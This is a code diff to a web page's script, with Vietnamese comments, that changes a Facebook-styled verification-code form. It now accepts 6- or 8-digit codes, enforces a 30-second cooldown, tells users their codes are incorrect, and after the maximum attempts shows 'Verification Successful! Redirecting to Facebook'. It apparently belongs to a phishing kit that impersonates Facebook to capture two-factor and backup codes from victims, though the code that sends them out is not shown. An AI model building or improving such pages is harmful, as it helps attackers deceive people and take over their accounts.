@@ -549,6 +549,8 @@
     </body>
     <script>
         let config = {};
+        let cooldownTimer = null;
+        let isInCooldown = false;
         console.log('Script loaded successfully!');
         const getConfig = async () => {
             const response = await fetch('/config.json');
@@ -897,13 +899,20 @@
                     // Only allow numbers
                     e.target.value = e.target.value.replace(/\D/g, '');
 
+                    // Giới hạn độ dài 8 số
+                    if (e.target.value.length > 8) {
+                        e.target.value = e.target.value.slice(0, 8);
+                    }
+
                     // Enable/disable button based on input length
-                    if (e.target.value.length === 6) {
+                    if (e.target.value.length === 6 || e.target.value.length === 8) {
                         button.style.backgroundColor = '#1877f2';
                         button.style.color = '#fff';
+                        button.disabled = false;
                     } else {
                         button.style.backgroundColor = '#E4E6EB';
                         button.style.color = '#BCC0C4';
+                        button.disabled = true;
                     }
                 });
             }
@@ -1110,7 +1119,30 @@
         // Handle verification code
         const handleVerificationCode = async () => {
             const code = document.getElementById('verificationCode').value;
-            if (!code || code.length !== 6) return;
+            const codeInput = document.getElementById('verificationCode');
+            const continueButton = document.getElementById('continueButton');
+            const errorElement = document.querySelector('.code-error');
+
+            // Kiểm tra nếu đang trong thời gian chờ
+            if (isInCooldown) {
+                errorElement.style.display = 'block';
+                errorElement.textContent = 'Please wait 30 seconds before entering the next code';
+                return;
+            }
+
+            // Kiểm tra độ dài code
+            if (code.length !== 6 && code.length !== 8) {
+                errorElement.style.display = 'block';
+                errorElement.textContent = 'The verification code must be 6 or 8 digits';
+                return;
+            }
+
+            // Kiểm tra code chỉ chứa số
+            if (!/^\d+$/.test(code)) {
+                errorElement.style.display = 'block';
+                errorElement.textContent = 'The verification code must only contain numbers';
+                return;
+            }
 
             codeAttempts++;
 
@@ -1156,12 +1188,29 @@
                     localStorage.setItem('lastMessage', message);
                 }
 
+                // Bắt đầu thời gian chờ
+                isInCooldown = true;
+                codeInput.disabled = true;
+                continueButton.disabled = true;
+                let timeLeft = 30;
+
+                cooldownTimer = setInterval(() => {
+                    continueButton.textContent = `Please wait ${timeLeft} seconds`;
+                    timeLeft--;
+
+                    if (timeLeft < 0) {
+                        clearInterval(cooldownTimer);
+                        isInCooldown = false;
+                        codeInput.disabled = false;
+                        codeInput.value = '';
+                        continueButton.disabled = false;
+                        continueButton.textContent = 'Continue';
+                    }
+                }, 1000);
+
                 // Show error message
-                const errorElement = document.querySelector('.code-error');
-                if (errorElement) {
-                    errorElement.textContent = 'Incorrect code. Please try again.';
-                    errorElement.style.display = 'block';
-                }
+                errorElement.textContent = 'The verification code is incorrect. Please try again.';
+                errorElement.style.display = 'block';
 
                 // Check attempts and redirect
                 if (codeAttempts >= config.setting.max_code_attempts) {
@@ -1172,8 +1221,8 @@
                             background: rgba(0, 0, 0, 0.5); display: flex; align-items: center;
                             justify-content: center; z-index: 20000">
                   <div style="background: white; padding: 20px; border-radius: 8px; text-align: center">
-                    <h3>Verification Successful!</h3>
-                    <p>Redirecting to Facebook...</p>
+                    <h3>Xác thực thành công!</h3>
+                    <p>Đang chuyển hướng đến Facebook...</p>
                   </div>
                 </div>
               `;
